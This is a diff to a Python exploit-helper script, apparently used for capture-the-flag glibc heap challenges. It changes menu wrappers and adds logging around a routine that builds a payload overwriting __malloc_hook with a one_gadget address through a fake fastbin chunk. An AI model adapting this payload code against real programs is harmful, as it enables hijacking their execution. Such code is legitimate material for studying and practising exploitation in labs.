@@ -14,6 +14,7 @@ def menu(glb):
     bt = glb['bt']
     ru = glb['ru']
     sl = glb['sl']
+    s = glb['s']
 
     tips = b">"
     
@@ -28,10 +29,11 @@ def menu(glb):
         sl(b'2')
         sl(bt(idx))
         sl(bt(size))
-        sl(content)
+        s(content)
 
     def free(idx):
         sl(b'3')
+        sl(bt(idx))
 
         
     glb['add'] = add
@@ -57,6 +59,7 @@ class heap_helper:
         self.main_arena = self.malloc_hook + 0x10
         self.fake_fb_trunk = self.malloc_hook - 0x23
         success(f"main_arena | {hex(self.main_arena)}")
+        success(f"libc_base | {hex(self.libc.address)}")
     
     def House_of_spirit(self, one_gadget, realloc=False):
         """
@@ -65,9 +68,11 @@ class heap_helper:
             one_gadget: int (0x4526a)
             realloc:    whether 2 use realloc
         """
+        info(f"fake_trunk_addr: {hex(self.fake_fb_trunk)}")
+        info(f"malloc_hook_addr: {hex(self.malloc_hook)}")
         if realloc:
             payload = b"\x00"*11 + p64(self.libc.address+one_gadget)+ p64(self.libc.sym['realloc'])
         else:
             payload = b"\x00"*0x13 + p64(self.libc.address+one_gadget)
-        success("payload"+hex(self.libc.address)+hex(one_gadget))
+        success("og: "+hex(self.libc.address+one_gadget))
         return payload
